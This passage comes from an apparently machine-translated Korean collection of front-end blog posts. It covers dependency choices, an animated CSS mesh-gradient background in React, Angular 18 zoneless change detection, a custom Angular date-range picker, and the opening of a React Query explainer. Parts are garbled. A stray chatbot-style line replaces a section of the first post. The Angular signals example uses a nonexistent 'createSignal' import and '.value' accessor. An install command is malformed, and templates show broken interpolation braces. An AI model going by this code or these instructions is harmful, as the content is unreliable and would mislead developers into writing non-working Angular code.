버전(e.g., Vue 4)로 업데이트하려면 PrimeVue 컴포넌트와의 호환성을 확인해야 합니다.\n- 라이브러리(Tailwind CSS, PrimeVue, SCSS) 중 하나라도 사용 중지되면, 코드를 상당히 리팩토링하거나 다시 작성해야 할 수도 있습니다.\n\n프로젝트의 수명을 연장하는 데 중요한 것은 최소한의 종속성(특히 전체 프로젝트를 변경할 수 있는 종속성)을 가지고 있는 것을 알 수 있습니다.\n\n# 종속성 감싸기\n\n프론트엔드 개발자로서 모든 것을 처음부터 쓰는 것은 불가능합니다. 그러나 한 라이브러리와 영원히 결혼하길 원하지도 않습니다. 라이브러리의 API가 프로젝트와 일치하지 않을 수도 있습니다.\n\n<div class=\"content-ad\"></div>\n\n판단력이 중요하죠! 제가 도와드릴 수 있는 게 있으면 언제든 말해주세요!\n\n<div class=\"content-ad\"></div>\n\n# 프레임워크 가이드라인을 준수하고 만들어진 표준을 사용하세요\n\n사용 중인 프레임워크에는 가이드라인, 네이밍 규약 및 권장 구조가 있다면 정말 좋은 일입니다!\n\n왜냐하면 여러분은 바퀴를 다시 발명할 필요가 없을 뿐더러(아마도 최악의 바퀴), 모든 규칙을 문서화할 필요가 없고 프레임워크 문서에 링크만 걸어놓으면 됩니다.\n\n![2024-06-27-StartingaFrontendprojectthatwontturnintoanightmarein2years_0.png](/assets/img/2024-06-27-StartingaFrontendprojectthatwontturnintoanightmarein2years_0.png)\n\n<div class=\"content-ad\"></div>\n\n팀 내에서 자전거 건물 토론을 피하고 중요한 부분에 집중할 수 있어요.\n\nVue.js 스타일 가이드는 큰 프로젝트를 깔끔하게 유지하는 데 도움이 되는 많은 좋은 컨벤션들을 이미 갖고 있어 좋은 예시에요. 또한, Vue가 권장하는 폴더 구조와 함께 보일러플레이트를 생성하는 방식도 맘에 들어요.\n\n# SOLID 원칙 사용하기\n\n프런트엔드를 하다보면 다른 소프트웨어 엔지니어링 문화와는 별개로 따로 있는 것처럼 생각할 때가 있지만, 사실은 기계가 실행할 코드를 작성하고 있기 때문에 수년간의 소프트웨어 엔지니어링 경험을 활용하는 것이 프런트엔드에 유익하답니다.\n\n<div class=\"content-ad\"></div>\n\n여러 프론트엔드 프로젝트에서 SOLID를 사용하는 데 도움이 되는 좋은 기사들이 많이 있어요. 예를 들어,\n\n- React에 SOLID 적용하기\n- 미치지 않고 Vue.js 컴포넌트 라이브러리 만들기\n\n그리고 검색을 통해 더 많은 정보를 얻을 수 있어요.\n\n# 가이드라인 페이지가 있어요\n\n<div class=\"content-ad\"></div>\n\n프로젝트 기술 스택을 설명하는 다양한 하위 페이지가 포함된 가이드 라인 페이지가 있도록 해주세요. Vue 스타일 가이드와 같은 모든 관련 온라인 문서 및 가이드라인에 대한 링크가 포함되어야 합니다. 이 포괄적인 리소스는 기술 프레임워크와 모범 사례의 중심 허브로 작용할 것입니다.\n\n또한, 가이드라인은 철학을 상세히 설명하고 프로젝트가 확장 가능하고 유지 보수가 용이하도록하는 데 필요한 모든 정보를 제공해야 합니다. 이는 개발 프로세스 전반에 걸쳐 일관성과 품질을 유지하는 데 도움이 될 것입니다.\n\n기억하세요. 초기 선택 사항은 초기 개발뿐만 아니라 향후 확장성과 유지 보수의 용이성에도 영향을 줍니다.\n\n귀하의 프론트엔드 프로젝트를 유지 가능하고 확장 가능하게 유지하는 데 효과적인 전략은 무엇인가요? 아래 댓글에서 귀하의 생각과 경험을 들어보고 싶습니다.","ogImage":{"url":"/assets/img/2024-06-27-StartingaFrontendprojectthatwontturnintoanightmarein2years_0.png"},"coverImage":"/assets/img/2024-06-27-StartingaFrontendprojectthatwontturnintoanightmarein2years_0.png","tag":["Tech"],"readingTime":4},{"title":"움직이는 메쉬 그라데이션 배경으로 웹사이트에 생명을 불어넣는 방법","description":"","date":"2024-06-27 18:24","slug":"2024-06-27-BringingLifetoYourWebsitewithMovingMeshGradientBackgrounds","content":"\n\n요즘에는 메쉬 그라데이션 디자인이 점점 더 인기를 끌고 있는 것 같아요.\n\n이것이 저에게 궁금증을 일으켰는데, 만약 이 그라데이션을 애니메이션화해서 더 생동감 있게 만들 수 있을까요?\n\n![이미지](/assets/img/2024-06-27-BringingLifetoYourWebsitewithMovingMeshGradientBackgrounds_0.png)\n\n본문에서는 움직이는 메쉬 그라디언트 배경을 애니메이션화하여 웹사이트에 다이내미즘과 생동감을 더해주는 방법을 배워보겠어요.\n\n<div class=\"content-ad\"></div>\n\n<img src=\"https://miro.medium.com/v2/resize:fit:1400/1*PL_QXqTv_ibiPlDv9Ux1NQ.gif\" />\n\n# 준비물\n\n시작하기 전에 다음 사항을 준비해주세요:\n\n- React 프로젝트가 설정되어 있어야 합니다.\n- Tailwind 종속성이 설치되어 있어야 합니다. npm install -D tailwindcss postcss autoprefixer && npx tailwindcss init -p\n\n<div class=\"content-ad\"></div>\n\n\n![이미지](/assets/img/2024-06-27-BringingLifetoYourWebsitewithMovingMeshGradientBackgrounds_1.png)\n\n# Mesh Gradient 배경 구현하기\n\n## 단계 1: Mesh Gradient Generator 찾기\n\n먼저, 우리는 애니메이션할 수 있는 mesh gradient를 생성해야 합니다. 빠른 구글 검색으로 몇 가지 훌륭한 mesh gradient 생성기를 찾을 수 있습니다. 이 기사에서는 CSS 형식으로 mesh gradient를 출력할 수 있는 것이 필요합니다. https://csshero.org/mesher/ 이 사이트를 사용해보세요.\n\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-06-27-BringingLifetoYourWebsitewithMovingMeshGradientBackgrounds_2.png\" />\n\n## 단계 2: 메시 그라디언트 CSS를 배경으로 추가하기\n\n생성기에서 CSS 코드를 복사하여 React 컴포넌트에 추가해보세요. 그러면 배경이 메시 그라디언트로 변경될 것입니다.\n\nMeshGradientBackground.jsx\n\n<div class=\"content-ad\"></div>\n\n```js\nimport React from 'react';\n\nfunction MeshGradientBackground(props) {\n    return (\n        <div style={ {position: 'relative', height: '100vh'} }>\n            {/* Background using ::before pseudo-element */}\n            <div style={\n                {\n                    position: 'absolute',\n                    top: 0,\n                    left: 0,\n                    width: '100%',\n                    height: '100%',\n                    zIndex: -1, // Ensure background is behind content\n                    backgroundColor: '#ff99df',\n                    backgroundImage: `\n                        radial-gradient(circle at 52% 73%, hsla(310, 85%, 67%, 1) 0px, transparent 50%),\n                        radial-gradient(circle at 0% 30%, hsla(197, 90%, 76%, 1) 0px, transparent 50%),\n                        radial-gradient(circle at 41% 26%, hsla(234, 79%, 69%, 1) 0px, transparent 50%),\n                        radial-gradient(circle at 41% 51%, hsla(41, 70%, 63%, 1) 0px, transparent 50%),\n                        radial-gradient(circle at 41% 88%, hsla(36, 83%, 61%, 1) 0px, transparent 50%),\n                        radial-gradient(circle at 76% 73%, hsla(346, 69%, 70%, 1) 0px, transparent 50%),\n                        radial-gradient(circle at 29% 37%, hsla(272, 96%, 64%, 1) 0px, transparent 50%)`,\n                    backgroundSize: '100% 100%',\n                    filter: 'blur(80px)',\n                }\n            }></div>\n  \n        </div>\n    );\n}\n\nexport default MeshGradientBackground;\r\n```\n\n![Moving Mesh Gradient Background](/assets/img/2024-06-27-BringingLifetoYourWebsitewithMovingMeshGradientBackgrounds_3.png)\n\n## 단계 3: 메쉬 그라디언트 배경 애니메이션화\n\n메쉬 그라디언트를 애니메이션화하는 것은 그라디언트 색상을 직접적으로 애니메이션화하는 것이 지원되지 않기 때문에 까다로울 수 있습니다. 이 문제를 해결하기 위해 배경 크기를 애니메이션화하여 움직임의 환상을 만들 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n업데이트한 내용이 있는 MeshGradientBackground.jsx 파일을 수정해주세요.\n\n```js\nimport React from 'react';\nimport '../../styles.css'; // 이 파일에 @keyframes 정의가 포함되어 있는지 확인해주세요\n\nfunction MeshGradientBackground(props) {\n    return (\n        <div style={{ position: 'relative', height: '100vh' }}>\n            {/* ::before 가상 요소를 사용한 배경 */}\n            <div style={{\n                position: 'absolute',\n                top: 0,\n                left: 0,\n                width: '100%',\n                height: '100%',\n                zIndex: -1, // 배경이 내용 뒤에 있도록 함\n                backgroundColor: '#ff99df',\n                backgroundImage: `\n                    radial-gradient(circle at 52% 73%, hsla(310, 85%, 67%, 1) 0px, transparent 50%),\n                    radial-gradient(circle at 0% 30%, hsla(197, 90%, 76%, 1) 0px, transparent 50%),\n                    radial-gradient(circle at 41% 26%, hsla(234, 79%, 69%, 1) 0px, transparent 50%),\n                    radial-gradient(circle at 41% 51%, hsla(41, 70%, 63%, 1) 0px, transparent 50%),\n                    radial-gradient(circle at 41% 88%, hsla(36, 83%, 61%, 1) 0px, transparent 50%),\n                    radial-gradient(circle at 76% 73%, hsla(346, 69%, 70%, 1) 0px, transparent 50%),\n                    radial-gradient(circle at 29% 37%, hsla(272, 96%, 64%, 1) 0px, transparent 50%)`,\n                backgroundSize: '150% 150%',\n                filter: 'blur(80px)',\n                animation: 'moveBackground 10s linear infinite',\n            }}></div>\n  \n        </div>\n    );\n}\n\nexport default MeshGradientBackground;\n```\n\nstyles.css 파일을 추가해주세요.\n\n```css\n@keyframes moveBackground {\n    0% { background-size: 100% 100%; }\n    10% { background-size: 120% 80%; }\n    20% { background-size: 190% 140%; }\n    30% { background-size: 130% 110%; }\n    40% { background-size: 150% 120%; }\n    50% { background-size: 180% 100%; }\n    60% { background-size: 220% 80%; }\n    70% { background-size: 100% 50%; }\n    80% { background-size: 120% 70%; }\n    90% { background-size: 110% 90%; }\n    100% { background-size: 100% 100%; }\n}\n```\n\n<div class=\"content-ad\"></div>\n\n\n![Background Animation](https://miro.medium.com/v2/resize:fit:1400/1*GURQVNHCw-MtVgHjeS4GcQ.gif)\n\nThe background should move like this.\n\nExplanation:\n\nThe moveBackground animation is applied to this div, making the background size change over time, which gives the illusion of movement.\n\n\n<div class=\"content-ad\"></div>\n\n요렇게 하면 됩니다 — 메쉬 그라데이션 배경을 애니메이션화하는 간단한 키프레임 애니메이션이 완성되었어요.\n\n하지만 여기서 멈출 수 없었어요. 이 아름다운 배경의 매력을 전시하는 전체 랜딩 페이지로 만들고 싶었거든요. 그래서 Figma에서 디자인을 만들고 코드로 구현했어요.\n\n![GIF](https://miro.medium.com/v2/resize:fit:1400/1*PL_QXqTv_ibiPlDv9Ux1NQ.gif)\n\n전체 구성 요소를 다운로드하려면 제 GitHub를 확인해주세요!","ogImage":{"url":"/assets/img/2024-06-27-BringingLifetoYourWebsitewithMovingMeshGradientBackgrounds_0.png"},"coverImage":"/assets/img/2024-06-27-BringingLifetoYourWebsitewithMovingMeshGradientBackgrounds_0.png","tag":["Tech"],"readingTime":6},{"title":"Angular 18 Zoneless 2024년 핵심 기능 탐구","description":"","date":"2024-06-27 18:23","slug":"2024-06-27-Angular18ZonelessExploringthePillars","content":"\n\n\n![Image](/assets/img/2024-06-27-Angular18ZonelessExploringthePillars_0.png)\n\n\"동의하지 않을 수도 있지만, 저는 Angular이 존리스(zoneless)가 되길 원했고 실현될 줄은 상상도 못 했습니다. 이제 실험 모드로 Angular 18에서 사용할 수 있습니다. 제발 프로덕션 환경에서 사용하지 마십시오.\"\n\n# 존리스(zoneless)란?\n\n네, 맞습니다. Angular의 존리스 설정에서 Angular 스케줄러는 컴포넌트 내에서 무언가 변경되었을 때 변경 감지를 자동으로 트리거하지 않습니다. 대신 Angular의 ChangeDetectorRef 서비스를 사용하여 변경 감지를 수동으로 트리거해야 합니다.\n\n\n<div class=\"content-ad\"></div>\n\n여기 간단한 설명이 있어요:\n\nZone.js를 사용하는 기존 Angular 애플리케이션에서는 Angular이 모든 비동기 작업(HTTP 요청, setTimeout, 사용자 상호작용 등)이 완료될 때 자동으로 변경 감지를 트리거합니다. Zone.js는 이러한 비동기 작업들을 monkey-patch하여 Angular에게 변경 감지를 실행할 때 알리게 합니다.\n\n우리가 무언가를 요리했다고 생각하실 지도 모르겠지만, 네 개의 기둥은 어디에 있을까요? 🧐\n\n우선, Angular 18의 zoneless API를 확인하는 설정을 해야 합니다.\n\n<div class=\"content-ad\"></div>\n\n- 설치.\n\n```js\nng install @angular/cli@^18\n```\n\n2. 새 앱 만들기\n\n```js\nng new zoneless-app\ncd zoneless-app\n```\n\n<div class=\"content-ad\"></div>\n\n3. app.config.ts 파일이나 애플리케이션 부트스트랩 파일로 이동하세요.\n\n```js\nimport { ApplicationConfig, provideExperimentalZonelessChangeDetection, provideZoneChangeDetection } from '@angular/core';\nimport { provideRouter } from '@angular/router';\n\nimport { routes } from './app.routes';\n\nexport const appConfig: ApplicationConfig = {\n  providers: [provideExperimentalZonelessChangeDetection(), provideRouter(routes)]\n};\n```\n\n4. angular.json의 폴리필에서 zone.js를 제거하세요.\n\n<img src=\"/assets/img/2024-06-27-Angular18ZonelessExploringthePillars_1.png\" />\n\n<div class=\"content-ad\"></div>\n\n이제 모든 설정이 완료되었으니 애플리케이션을 실행하면 됩니다.\n\n이제 이 설정 이후에는 Angular가 자동으로 변경 감지를 트리거하지 않습니다.\n\n# 왜 zoneless를 사용해야 하는가? .\n\n불필요한 변경 감지를 피하기 위해서 간단하게 제안드립니다.\n\n<div class=\"content-ad\"></div>\n\n모든 컴포넌트의 비동기 작업이 발생할 때 Angular는 루트부터 모든 하위 컴포넌트를 확인하는데, 이는 비효율적일 수 있습니다.\n\n\"changeDetection\" 전략 \"OnPush\"를 사용하여 이 문제를 극복할 수 있는 옵션이 있습니다. 이는 컴포넌트와 해당 모든 하위 컴포넌트를 일반 변경 감지 주기에서 격리시킵니다.\n\n# 네 기둥이 무엇인가요?\n\n- 이벤트 핸들러.\n- MarkForChanges 관리.\n- 비동기 파이프.\n- 시그널.\n\n<div class=\"content-ad\"></div>\n\n## 이벤트 핸들러 :\n\n앵귤러의 이벤트 핸들러는 템플릿의 이벤트에 바인딩된 컴포넌트 클래스 내의 메서드입니다.\n\n```js\nimport { Component } from '@angular/core';\n\n@Component({\n  selector: 'app-root',\n  template: '<button (click)=\"onClick()\">{state}</button>'\n})\nexport class AppComponent {\n state = \"Click Me\";\n  onClick() {\n    this.state = \"Clicked\";\n  }\n}\n```\n\n## MarkForChanges 관리하기:\n\n<div class=\"content-ad\"></div>\n\n앵귤러에서, markForCheck은 앵귤러의 기본 변경 감지가 변경 사항을 감지하지 못하는 시나리오에서 사용됩니다. 이는 OnPush 변경 감지 전략 및 지금은 zoneless에서 일반적입니다.\n\n```js\nimport { ChangeDetectorRef, Component } from '@angular/core';\n\n@Component({\n  selector: 'app-root',\n  template: `\n      {data}\n      <button (click)=\"update()\">Update</button>\n     `,\n})\nexport class AppComponent {\n  data = '초기 데이터';\n\n  constructor(private cdr: ChangeDetectorRef) { }\n\n  update() {\n    this.data = '업데이트된 데이터';\n    this.cdr.markForCheck();\n  }\n}\n```\n\n## Async 파이프 :\n\n앵귤러의 AsyncPipe는 Observable 또는 Promise에 자동으로 구독하고 최신 값을 반환합니다. 또한 컴포넌트가 파괴될 때 자동으로 구독을 해제합니다.\n\n<div class=\"content-ad\"></div>\n\n```js\nimport { CommonModule } from '@angular/common';\nimport { ChangeDetectionStrategy, ChangeDetectorRef, Component, inject } from '@angular/core';\nimport { bootstrapApplication } from '@angular/platform-browser';\nimport { Observable, of } from 'rxjs';\nimport 'zone.js';\n@Component({\n  selector: 'app-root',\n  standalone: true,\n  template: `\n     Hello world\n     {data$ | async }\n  `,\n  changeDetection: ChangeDetectionStrategy.OnPush,\n  imports: [CommonModule],\n})\nexport class App {\n  name = 'Angular';\n  data$: Observable<string> | undefined;\n  cRef = inject(ChangeDetectorRef);\n\n  constructor() {\n    setTimeout(() => {\n      this.data$ = of('Hello, AsyncPipe!');\n      this.cRef.markForCheck();\n    }, 4000);\n  }\n}\n\nbootstrapApplication(App);\n```\n\n## Signals:\n\nAngular에 Signals가 포함되어 정말 기쁩니다. 이전에는 불필요한 다시 렌더링 오버헤드를 극복하기 위해 신호를 사용해야 했습니다. 또한 이제 더 선언적 프로그래밍 스타일로 코드를 작성할 수 있고, 대부분의 주요 API는 Signals과 호환됩니다. 이것은 반응성을 위해 더 이상 RxJS에 의존하지 않아도 된다는 것을 의미합니다.\n\n```js\nimport { Component } from '@angular/core';\nimport { Signal, createSignal } from '@angular/core/signals';\n\n@Component({\n  selector: 'app-counter',\n  standalone: true,\n  template: `\n    <div class=\"counter\">\n      <h1>Counter: { count.value }</h1>\n      <button (click)=\"decrement()\">-</button>\n      <button (click)=\"increment()\">+</button>\n    </div>\n  `,\n  styles: [`\n    .counter {\n      text-align: center;\n      margin-top: 50px;\n    }\n    button {\n      margin: 0 5px;\n      padding: 10px;\n      font-size: 16px;\n    }\n  `]\n})\nexport class CounterComponent {\n  // Count 상태를 관리하기 위한 Signal 생성\n  count: Signal<number> = createSignal(0);\n\n  // Count 증가 메소드\n  increment() {\n    this.count.set(this.count.value + 1);\n  }\n\n  // Count 감소 메소드\n  decrement() {\n    this.count.set(this.count.value - 1);\n  }\n}\n```\n\n<div class=\"content-ad\"></div>\n\n\"markForCheck\" 또는 수동 변경 감지가 필요하지 않습니다.\n\n신호 패턴 때문에 수동 변경 감지 확인이 필요하지 않습니다. 수동 코드 작성 부담이 줄어들고, Angular 팀은 Input/Output, ViewChild 및 기타 모든 API를 신호로 변환하고 있습니다.\n\n## 마지막 기둥:\n\nSSR은 Angular의 마지막 기둥입니다. 다음 포스트에서 계속합니다.\n\n<div class=\"content-ad\"></div>\n\n## 결론:\n\nAngular은 이제 시그널의 도입으로 올바른 방향으로 나아가고 있습니다. Angular를 지원하는 중요한 요소 가운데 시그널이 특히 두드러집니다. 시그널은 Angular 18에서 존리스 작업으로의 전환을 용이하게 하뿐만 아니라 불필요한 다시 렌더링과 수동 변경 감지 확인의 부담으로부터 자유로움을 제공합니다. 이 방식은 성능을 향상시키는 것뿐만 아니라 더 선언적인 코딩 스타일을 촉진합니다.\n\n서버 측 렌더링(SSR)은 Angular의 중요한 측면으로 남아 있으며, 제가 이후에 다룰 것입니다. 이 네 가지 중요한 요소인 이벤트 핸들러, MarkForChanges 관리, 비동기 파이프, 그리고 시그널을 계속 탐험하면 코드를 더 읽기 쉽고 간단하게 만드는 데 기여하는 방법을 발견할 것입니다.\n\n즐거운 코딩되세요!","ogImage":{"url":"/assets/img/2024-06-27-Angular18ZonelessExploringthePillars_0.png"},"coverImage":"/assets/img/2024-06-27-Angular18ZonelessExploringthePillars_0.png","tag":["Tech"],"readingTime":6},{"title":"Angular로 사용자 지정 날짜 범위 선택기 만드는 방법","description":"","date":"2024-06-27 18:22","slug":"2024-06-27-CreatingaCustomDatesRangePickerinAngular","content":"\n\n이 글은 Angular에서 구성 요소로써 처음부터 날짜 범위 선택기를 만드는 방법을 설명하는 것을 목표로 하고 있습니다. 이것은 제 첫 번째 글의 두 번째 버전으로 여기에서 찾을 수 있습니다: [Medium 링크](https://medium.com/stackademic/creating-a-custom-date-time-picker-in-angular-5f00591d641c). 또한, 다음 글에서 작성할 사용자 정의 구성 요소의 장점을 잊지 않으세요.\n\n![이미지](/assets/img/2024-06-27-CreatingaCustomDatesRangePickerinAngular_0.png)\n  \n## 생성 의도\n\n이 구성 요소를 만들기 전에, 쉽게 스타일링할 수 있고 다음을 제공하는 범용 날짜 선택기를 찾고 있었습니다: 날짜 선택, 시간 선택, 범위 선택. 제가 필요한 것은 간단한 것이었지만, 조사 중에 대부분의 날짜 선택기가 너무 복잡하거나 필요한 조합을 제공하지 않는 것을 발견했습니다.\n\n<div class=\"content-ad\"></div>\n\n## 필요한 기능들:\n\n- 날짜 - 시간 선택기\n- 오직 날짜 선택기\n- 오직 시간 선택기\n- 날짜 - 범위 선택기\n\n이전에는 이 모든 것이 있었지만 범위 기능만 빠졌었어요. 그래서 논리를 간단한 말로 적어보기 시작했어요:\n\n# 논리\n\n<div class=\"content-ad\"></div>\n\n범위=false인 경우에 대한 두 가지 다른 출력이 필요합니다. 하나는 단일 선택이고 두 번째는 선택된 범위 배열이며 selectedRange[0]는 시작 선택이되고 selectedRange[1]는 끝 선택이됩니다.\n\n\n![Creating a Custom Dates Range Picker in Angular](/assets/img/2024-06-27-CreatingaCustomDatesRangePickerinAngular_1.png)\n\n\n그런 다음 범위를 확인하여 시각적으로 선택을 표시할 수 있도록해야합니다.\n\n```js\ninRangeSelection(i: number) {\n  const currentDay = new Date(\n    this.date.getFullYear(),\n    this.date.getMonth(),\n    i\n  );\n\n  return (\n    this.range &&\n    this.clickedDate &&\n    this.clickedToDate &&\n    this.clickedDate.getDate() < currentDay.getDate() &&\n    this.clickedToDate.getDate() > currentDay.getDate() &&\n    this.clickedDate.getFullYear() >= currentDay.getFullYear() &&\n    this.clickedToDate.getFullYear() >= currentDay.getFullYear() &&\n    this.clickedDate.getMonth() >= currentDay.getMonth() &&\n    this.clickedToDate.getMonth() >= currentDay.getMonth()\n  );\n}\n```\n\n<div class=\"content-ad\"></div>\n\n```js\n  setDate(index: number) {\n    // 만약 범위 선택이 요청된 경우\n    if (this.range) {\n      // 순서가 매우 중요합니다 -> 이미 범위가 있는 경우 새로운 선택을 클릭하면 다시 처음부터 시작합니다\n      if (this.clickedDate && this.clickedToDate) {\n        this.clickedDate = null;\n        this.clickedToDate = null;\n      }\n\n      // 이미 첫 번째 선택이 있는 경우 값을 clickedToDate에 할당합니다\n      if (this.clickedDate && !this.clickedToDate) {\n        this.clickedToDate = new Date(\n          this.date.getFullYear(),\n          this.date.getMonth(),\n          index\n        );\n      }\n\n      // 여기서만 첫 번째 및 가장 중요한 시작점 설정이 가능합니다\n      if (!this.clickedToDate && !this.clickedDate) {\n        this.clickedDate = new Date(\n          this.date.getFullYear(),\n          this.date.getMonth(),\n          index\n        );\n      }\n\n      // clickedToDate가 clickedDate보다 낮은 경우 뒤집습니다\n      if (\n        this.clickedDate &&\n        this.clickedToDate &&\n        this.clickedDate > this.clickedToDate\n      ) {\n        const clickedToDate = this.clickedDate;\n        const clickedDate = this.clickedToDate;\n        this.clickedDate = clickedDate;\n        this.clickedToDate = clickedToDate;\n      }\n    // 일반 모드에서\n    } else {\n      this.clickedDate = new Date(\n        this.date.getFullYear(),\n        this.date.getMonth(),\n        index\n      );\n    }\n  }\n```\n\n마지막으로 출력 메서드가 변경되었습니다:\n\n```js\n  confirm() {\n    if (this.range) {\n      if (this.clickedDate && this.clickedToDate) {\n        this.selectRange.emit([this.clickedDate, this.clickedToDate]);\n      }\n    } else {\n      if (this.clickedDate) {\n        this.clickedDate.setHours(this.timeForm.get('hours')?.value || 0);\n        this.clickedDate.setMinutes(this.timeForm.get('minutes')?.value || 0);\n        this.selectDate.emit(this.clickedDate);\n      }\n    }\n  }\n```\n\n## 모든 로직을 컴포넌트 내부에 놓게 된 이유는 무엇인가요?\n\n<div class=\"content-ad\"></div>\n\n만약 저장소에서 전체 컴포넌트를 확인했다면: https://github.com/marekpanti/dateTimePicker/blob/master/projects/marekpanti/angular-date-time-picker/src/lib/angular-date-time-picker.component.ts 아마도 궁금할 것입니다. 왜 Marek는 패서드와 깔끔한 컴포넌트에 대해 언급했을 때 모든 로직을 컴포넌트 내부에 넣는 건지요.\n\n룰에는 예외가 없는 법입니다. 복잡한 컴포넌트와 UI 컴포넌트의 경우, 나는 내 로직이 한 곳에 있기를 원합니다. 내 컴포넌트가 시각적이며 각 속성이 각 메소드와 연결되어 있음을 이해하기 때문에, 서비스를 분리하여 메소드를 읽는 것이 오히려 더 어려울 것입니다.\n\n# 결론\n\n이 글은 처음에 복잡해 보이지만 적절한 계획과 문제 이해로 자신만의 컴포넌트를 쉽게 만들 수 있는 방법을 잘 정리한 요약입니다.\n\n<div class=\"content-ad\"></div>\n\n# Stackademic 🎓\n\n끝까지 읽어 주셔서 감사합니다. 떠나시기 전에:\n\n- 작가를 칭찬하고 팔로우해 주시면 감사하겠습니다! 👏\n- 다음 채널을 구독해 주세요: X | LinkedIn | YouTube | Discord\n- 다른 플랫폼도 방문해 보세요: In Plain English | CoFeed | Differ\n- 더 많은 컨텐츠는 Stackademic.com에서 확인할 수 있습니다.","ogImage":{"url":"/assets/img/2024-06-27-CreatingaCustomDatesRangePickerinAngular_0.png"},"coverImage":"/assets/img/2024-06-27-CreatingaCustomDatesRangePickerinAngular_0.png","tag":["Tech"],"readingTime":5},{"title":"React Query 활용법 데이터 페칭 최강자 되기","description":"","date":"2024-06-27 18:20","slug":"2024-06-27-LeveragingReactQueryAData-FetchingPowerhouse","content":"\n\nReact 어플리케이션을 더 빠르게 만들어주는 캐싱이 어떻게 변화를 주는지 궁금했던 적이 있나요? 이 블로그에서 React Query가 캐싱을 활용하여 데이터 가져오기와 관리를 간편하게 하는 방법을 탐구하고 있습니다. 뿐만 아니라 효율적인 캐싱을 위한 다양한 방법들을 살펴볼 예정이에요. 게다가, 낙관적 업데이트의 힘도 발견해 볼 거예요. 이것은 거의 사용되지 않는 주요 최적화 기술이랍니다.\n\n캐시란 무엇인가요?\nReact Query에서 캐시는 API 요청의 결과를 저장하는 임시 저장 메커니즘입니다. 이는 React 컴포넌트와 서버 사이에서 중개 역할을 하며, 자주 필요한 것들을 기억해두고 필요할 때 즉시 제공하는 친구처럼 작동합니다.\nReact Query의 내부 메커니즘을 이해하는 것은 사용하기 전에 필수적이며, 어플리케이션의 상태 관리에서 중요한 역할을 합니다.\n\nreact query를 사용하여 API 호출하는 간단한 예제를 살펴보겠습니다(세부적으로 아래에서 설명됩니다)\n\n![이미지](/assets/img/2024-06-27-LeveragingReactQueryAData-FetchingPowerhouse_0.png)\n\n<div class=\"content-ad\"></div>\n\nAPI 호출 후 받은 응답은 데이터에 저장되고 키를 'user'로하여 캐싱됩니다.\n\nReact Query 작동 방식: 깊게 들어가기\nReact Query가 어떻게 작동하는지 알아보기 전에 몇 가지 주요 용어에 익숙해져 보겠습니다.\n\nQueryClient — 인스턴스를 생성할 때 생성되는 queryCache 및 mutationCache를 보유하는 용기/컨테이너입니다.\n\nQueryCache — 모든 가져온 데이터와 쿼리 세부 정보를 저장하는 중앙 메모리입니다. 고유한 키를 사용하여 특정 데이터를 찾고 결과를 캐싱하고 앱 전반에 걸쳐 데이터를 일관되게 관리하여 성능을 향상시킵니다.\n\n<div class=\"content-ad\"></div>\n\nMutationCache — React Query에서 변이(mutation)는 데이터를 업데이트하는 작업(항목 추가 또는 제거와 같은 작업)을 의미합니다. 이 캐시는 이러한 변이의 결과를 일시적으로 저장하여 서버에서 확인될 때까지 그 결과를 유지합니다.\n\nQuery — 쿼리는 데이터를 가져오는 핵심 작업입니다. 필요한 정보(데이터, 상태 등)를 보유하며 해당 데이터를 가져오는 함수를 실행하고 데이터가 변경될 때 다시 시도, 취소 및 업데이트를 관리합니다. 데이터 가져오기 과정을 위한 소규모 관리자와 같은 역할을 합니다.\n\nQueryObservers — 옵저버(observer)는 useQuery를 호출할 때 생성되며 쿼리에 구독된 상태입니다. 이것이 useQuery에 쿼리 키(queryKey)를 전달하는 이유입니다.\n\n![이미지](/assets/img/2024-06-27-LeveragingReactQueryAData-FetchingPowerhouse_1.png)\n\n<div class=\"content-ad\"></div>\n\n이제 내부 작업을 살펴보겠습니다 - \n구성 요소가 마운트될 때 QueryClient의 인스턴스가 생성되고 QueryClientProvider를 통해 전체 응용 프로그램에 전달되며 (내부적으로 React Context를 사용함) 컨텍스트를 통해 사용됩니다.\n\nquery 키와 함께 useQuery를 호출할 때 useQuery는 QueryClient와 상호 작용합니다. QueryClient는 queryKey로 식별된 데이터를 QueryCache에서 확인합니다. 데이터가 존재하고 캐시/풀린 시간을 충족하며 다시 가져오기가 트리거되지 않은 경우:\n\n- 캐시된 데이터가 직접 구성 요소로 반환되고 구성 요소가 캐시된 데이터로 렌더링됩니다.\n- useQuery에 의해 생성된 QueryObserver가 구성 요소에 가용한 데이터에 대해 알립니다.\n\n데이터가 캐시에 없거나 신선도 기준을 충족하지 못한 경우:\n\n<div class=\"content-ad\"></div>\n\n- 쿼리 객체가 생성되고(아직 없는 경우), QueryObserver가 설정되어 Query에 연결됩니다.\n\n두 경우 모두, 데이터가 가져오는 동안 초기로딩 상태를 포함한 객체가 있습니다. useQuery에 제공된 queryFunction은 비동기적으로 트리거되어 새로운 데이터를 가져옵니다. 데이터를 가져오면 QueryCache에 쿼리 키와 함께 저장되고 QueryObserver에 업데이트에 대해 알립니다. 구성요소는 useQuery 훅을 통해 업데이트된 데이터를 받아와 새로운 데이터로 재렌더링이 트리거됩니다.\n\nReact Query에서 비동기 작업을 수행하는 방법은 useQuery와 useMutation 두 가지가 있습니다. 이러한 훅을 탐색해 봅시다.\n- useQuery: React 구성요소에서 데이터를 가져오기 위해 React Query 내에서 사용되는 사용자 정의 훅입니다. 이 훅은 초기 가져오기 후 데이터 캐싱, 백그라운드에서 데이터 다시 가져오기 등 많은 기능을 관리합니다.\n\n![LeveragingReactQueryAData-FetchingPowerhouse_2.png](/assets/img/2024-06-27-LeveragingReactQueryAData-FetchingPowerhouse_2.png)\n\n<div class=\"content-ad\"></div>\n\nuseQuery 훅을 사용하여 구문 및 데이터를 가져오는 방법을 확인해 봅시다.\n세 가지 매개변수가 필요합니다 -\n\n쿼리 키: 데이터를 가져오고 캐시하며 응용 프로그램 전반에서 쿼리를 다시 가져올 때 사용되는 고유한 키입니다.\n\n쿼리 함수:이 함수에는 프라미스를 반환하거나 오류를 발생시키는 비동기 작업이 포함되어 있습니다.\n\n옵션: CacheTime, staleTime, refetchInterval, refetchOnWindowFocus, retry 등 여러 속성이 포함된 개체입니다. 자세한 내용은 여기를 참조하시기 바랍니다.\n\n<div class=\"content-ad\"></div>\n\nuseQuery 훅은 여러 속성을 포함한 객체를 반환합니다:\n\n- data: API 응답입니다.\n- isLoading: API 호출의 현재 상태를 나타내는 부울 플래그입니다.\n- error: 쿼리가 데이터를 가져오는 동안 오류가 발생했을 경우 나타나는 객체입니다.\n- 